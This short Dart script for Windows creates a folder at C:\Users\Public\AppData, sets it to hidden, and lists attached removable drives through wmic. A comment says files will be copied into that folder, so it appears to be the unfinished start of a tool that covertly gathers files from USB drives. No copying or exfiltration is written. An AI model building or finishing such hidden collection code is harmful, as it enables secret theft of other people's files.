import "dart:io";
import "dart:convert";

main() {
  Process.run("powershell", [
    "-command",
    "New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\AppData"
  ]); // Create folder where files will be copied.

  Process.run("powershell", [
    "-command",
    "\$f=get-item C:\\Users\\Public\\AppData -Force;\$f.attributes='Hidden'"
  ]); // Set the folder as hidden.

  Process.run('wmic', [
    'logicaldisk',
    'where',
    'drivetype=2',
    'get',
    'DeviceID'
  ]) // Check all drives of type "2" (= removable disk) connected to the device.
      .then((result) {
    String output = result.stdout;
    output = output.replaceAll("DeviceID", "").replaceAll(
        " ", ""); // Remove all useless infos in the output of the command.

    LineSplitter ls = new LineSplitter();
    List<String> lines = ls.convert(output); // Divide the output into a List.
    print(lines);
    String line;
    for (line in lines) {
      // Remove extra empty elements from the List.
      if (line == "") {
        //lines.remove(line);
        print(lines);
      } else {
        print(lines);
      }
    }
  });
}
